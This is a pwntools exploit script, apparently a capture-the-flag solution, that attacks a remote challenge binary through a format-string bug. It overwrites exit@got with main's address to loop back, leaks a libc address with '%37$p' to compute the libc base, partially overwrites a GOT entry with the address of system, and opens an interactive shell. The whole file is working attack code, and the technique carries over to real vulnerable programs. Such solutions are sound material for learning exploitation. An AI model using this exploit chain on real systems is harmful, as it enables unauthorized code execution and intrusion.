from pwn import *

elf = context.binary = ELF('./chall')
#p = process('./chall')
p = remote('0.cloud.chals.io', 30732)

#Setting our libc (note that patchelf was used to utilize libc and linker from docker)
libc = elf.libc

#Offset
offset = 8
#Memory to write to
ret_address = 0x404000
#What to write
desire = 0x4011db

#Looping back to main by writing mains address to exit@got.plt
payload = fmtstr_payload(offset, {ret_address : desire})
p.sendlineafter(b'This challenge seems easy enough', payload)

#Leaking libc address and calculating base
payload = b'%37$p'
p.sendlineafter(b'This challenge seems easy enough', payload)
p.recvline() # junk
leak = int((p.recvuntil(b'\n')[:-1]), 16)
libc.address = leak - 0x276ca
log.info(hex(libc.address))

#We really only need to overwrite the last two bytes of the libc address because its already a libc address with a different offset
payload = fmtstr_payload(offset, {0x404010 : p64(libc.sym['system'])[:2]})
p.sendlineafter(b'This challenge seems easy enough', payload)
p.interactive()